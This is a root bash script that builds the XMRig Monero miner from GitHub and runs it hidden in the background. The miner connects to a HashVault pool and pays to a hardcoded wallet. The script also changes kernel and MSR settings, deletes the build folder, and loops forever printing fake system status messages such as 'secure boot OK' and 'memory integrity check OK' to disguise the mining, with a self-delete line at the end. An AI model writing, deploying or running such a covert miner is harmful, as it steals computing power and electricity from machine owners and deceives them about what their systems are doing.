#!/bin/bash

apt update 
WALLET="84C9DKow5uJDWauDdreyXz9KQ8ZcQ5dkhKshb7EBXid9Amj5opVjnzY4iexNADdj37ABPBJEaDtdYMQKxP6cffHyGzFW6ZD"
POOL="asia.hashvault.pro:443"   
WORKER="${1:-FastRig}"  

REQUIRED_PACKAGES=("cmake" "git" "build-essential" "cmake" "automake" "libtool" "autoconf" "libhwloc-dev" "libuv1-dev" "libssl-dev" "msr-tools" "curl")

install_dependencies() {
    for package in "${REQUIRED_PACKAGES[@]}"; do
         apt install -y $package
    done
}

echo "[+] Checking and installing required dependencies..."
install_dependencies

echo "[+] Enabling hugepages..."
 sysctl -w vm.nr_hugepages=128

echo "[+] Writing hugepages config..."
 echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf

echo "[+] Setting ..."
modprobe msr 2>/dev/null
wrmsr -a 0x1a4 0xf 2>/dev/null

echo "[+] Cloning ..."
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build

echo "[+] Building ..."
cmake ..
make -j$(nproc)

echo "[+] starting in 2 seconds..."
sleep 2

echo "[+] Starting  pool..."
./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero -t $(nproc) > /dev/null 2>&1 &
cd ../../
rm -rf xmrig

while true; do
  echo "[INFO] Initializing module: net.core"
  sleep 2

  echo "[INFO] Syncing core clock with NTP server…"
  sleep 2

  echo "[INFO] Performing memory integrity check… OK"
  sleep 2

  RANDOM_PID=$(( RANDOM % 9000 + 1000 ))
  echo "[INFO] Task scheduler running: PID $RANDOM_PID"
  sleep 4

  echo "[INFO] Kernel modules verified: secure boot OK"
  sleep 2

  RANDOM_LATENCY=$(( RANDOM % 30 + 1 ))
  echo "[INFO] Network latency: ${RANDOM_LATENCY}ms"
  sleep 2
done
rm -- "$0"
